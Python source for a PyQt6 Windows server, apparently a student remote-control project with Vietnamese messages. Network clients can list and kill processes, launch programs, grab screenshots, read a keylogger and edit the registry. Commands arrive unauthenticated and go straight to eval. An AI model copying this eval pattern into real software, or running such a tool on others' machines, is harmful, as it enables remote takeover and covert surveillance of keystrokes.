import socket
from serverDesigner import ServerDesigner
import globalVar as gv
import sys
import os
import re
import subprocess
import winreg
from PyQt6.QtWidgets import QApplication
from PyQt6.QtNetwork import QTcpServer, QHostAddress, QAbstractSocket
from keylogger import Keylogger


class ServerApp(ServerDesigner):
    def __init__(self):
        super().__init__()
        self.keylogger = Keylogger()

    def getNetworkIP(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address

    def onButtonOpenServerClick(self):
        if gv.server is None:
            ip_address = self.getNetworkIP()
            print(ip_address)
            gv.server = QTcpServer(self)
            gv.server.listen(QHostAddress(ip_address), 5656)
            gv.server.newConnection.connect(self.onNewConnection)
            self.buttonOpenServer.setEnabled(False)

    def onNewConnection(self):
        gv.client = gv.server.nextPendingConnection()
        if gv.client.state() == QAbstractSocket.SocketState.ConnectedState:
            self.handleClient()

    def showApp(self):
        processes = subprocess.Popen([
            "powershell",
            "gps",
            "| ? { $_.MainWindowTitle }",
            "| select ProcessName, Id, @{Name='ThreadCount';Expression ={$_.Threads.Count}}, CPU"
        ], shell=True, stdout=subprocess.PIPE).stdout.readlines()[3:-2]
        processes = [process.decode().rstrip() for process in processes]
        apps = []

        for process in processes:
            m = re.match("(.+?) +(\d+) +(\d+) *(\d*,?\d*)", process)
            apps.append([m.group(1), m.group(2), m.group(3),
                        m.group(4) if m.group(4) else "0"])

        self.sendResponse(str(f"{len(str(apps))}\n"))
        self.sendResponse(str(apps))

    def kill(self, process_id):
        result = subprocess.call(
            ["powershell", "taskkill /F /PID", process_id],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )

        if result:
            # self.send_response(f"Failed to kill {process_id}\rPlease recheck if {process_id} exists")
            self.sendResponse(
                f"Error: Không tìm thấy chương trình {process_id}")
        else:
            self.sendResponse(f"Đã diệt chương trình {process_id}")

    def start(self, exe_name):
        result = subprocess.call(
            ["powershell", "Start-Process", exe_name],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )

        if result:
            self.sendResponse(f"Error: Không tìm thấy chương trình {exe_name}")
        else:
            self.sendResponse(f"Chương trình {exe_name} đã được bật")

    def takeScreenshot(self):
        path = os.path.join(os.path.dirname(__file__), "cache\\screenshot.bmp")

        QApplication.primaryScreen().grabWindow(0).save(path)

        with open(path, "rb") as f:
            data = f.read()

        self.sendResponse(str(f"{len(data)}\n"))
        self.sendResponse(data, True)

    def keylogHook(self):
        self.keylogger.hook()

    def keylogUnhook(self):
        self.keylogger.unhook()

    def keylogPrint(self):
        self.sendResponse(self.keylogger.print().replace("\n", "\r") + "\n")

    def keylogClear(self):
        self.keylogger.clear()

    def registryInject(self, registry):
        path = os.path.join(os.path.dirname(__file__),
                            "cache\\registryFile.reg")

        with open(path, "w") as f:
            f.write(registry)

        result = subprocess.run(
            f'regedit.exe /s "{path}"',
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        if result.stderr:
            self.sendResponse("Error: Sửa thất bại")
        else:
            self.sendResponse("Sửa thành công!")

    def registryGetValue(self, link, value_name):
        try:
            root_key, sub_key = link.split("\\", 1)
            root_key = getattr(winreg, root_key)
            key = winreg.OpenKey(root_key, sub_key)
            value, _ = winreg.QueryValueEx(key, value_name)
            winreg.CloseKey(key)

            self.sendResponse(f"{value}\n")
        except Exception as e:
            self.sendResponse(f"Error: {e}\n")

    def registrySetValue(self, link, value_name, value, op_type):
        try:
            root_key, sub_key = link.split("\\", 1)
            root_key = getattr(winreg, root_key)
            key = winreg.OpenKey(root_key, sub_key, 0, winreg.KEY_SET_VALUE)
            value_type = ""

            if op_type == "String":
                value_type = winreg.REG_SZ
            elif op_type == "Multi-String":
                value_type = winreg.REG_MULTI_SZ
            elif op_type == "Expandable String":
                value_type = winreg.REG_EXPAND_SZ
            elif op_type == "DWORD":
                value_type = winreg.REG_DWORD
                value = int(value)
            elif op_type == "QWORD":
                value_type = winreg.REG_QWORD
                value = int(value)
            elif op_type == "Binary":
                value_type = winreg.REG_BINARY
                value = bytes(map(int, value.split()))
            else:
                self.sendResponse("Error: kiểu không hợp lệ\n")
                return

            winreg.SetValueEx(key, value_name, 0, value_type, value)
            winreg.CloseKey(key)

            self.sendResponse("Set value thành công\n")
        except Exception as e:
            self.sendResponse(f"Error: {e}\n")

    def registryDeleteValue(self, link, value_name):
        try:
            root_key, sub_key = link.split("\\", 1)
            root_key = getattr(winreg, root_key)
            key = winreg.OpenKey(root_key, sub_key, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, value_name)
            winreg.CloseKey(key)

            self.sendResponse("Xóa value thành công\n")
        except Exception as e:
            self.sendResponse(f"Error: {e}\n")

    def registryCreateKey(self, link):
        try:
            root_key, sub_key = link.split("\\", 1)
            root_key = getattr(winreg, root_key)
            key = winreg.CreateKey(root_key, sub_key)
            winreg.CloseKey(key)

            self.sendResponse("Tạo key thành công\n")
        except Exception as e:
            self.sendResponse(f"Error: {e}\n")

    def registryDeleteKey(self, link):
        try:
            root_key, sub_key = link.split("\\", 1)
            root_key = getattr(winreg, root_key)
            winreg.DeleteKey(root_key, sub_key)

            self.sendResponse("Xóa key thành công\n")
        except Exception as e:
            self.sendResponse(f"Error: {e}\n")

    def showProcess(self):
        processes = subprocess.Popen([
            "powershell",
            "gps",
            "| select ProcessName, Id, @{Name='ThreadCount';Expression ={$_.Threads.Count}}, CPU"
        ], shell=True, stdout=subprocess.PIPE).stdout.readlines()[3:-2]
        processes = [process.decode().rstrip() for process in processes]
        apps = []

        for process in processes:
            m = re.match("(.+?) +(\d+) +(\d+) *(\d*,?\d*)", process)
            apps.append([m.group(1), m.group(2), m.group(3),
                        m.group(4) if m.group(4) else "0"])

        self.sendResponse(str(f"{len(str(apps))}\n"))
        self.sendResponse(str(apps))

    def handleClient(self):
        while True:
            function_call = self.receiveSignal()
            function = function_call.split("(")[0]

            if hasattr(self, function):
                eval(f"self.{function_call}")
                # print(function_call)

    def receiveSignal(self, size=1024):
        try:
            gv.client.waitForReadyRead()
            return gv.client.read(size).decode()
        except:
            self.quit()

    def sendResponse(self, response, raw=False):
        gv.client.write(response if raw else response.encode())
        gv.client.flush()
        gv.client.waitForBytesWritten()

    def quit(self):
        gv.client.close()
        gv.server.close()
        exit()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    serverApp = ServerApp()
    serverApp.show()
    sys.exit(app.exec())
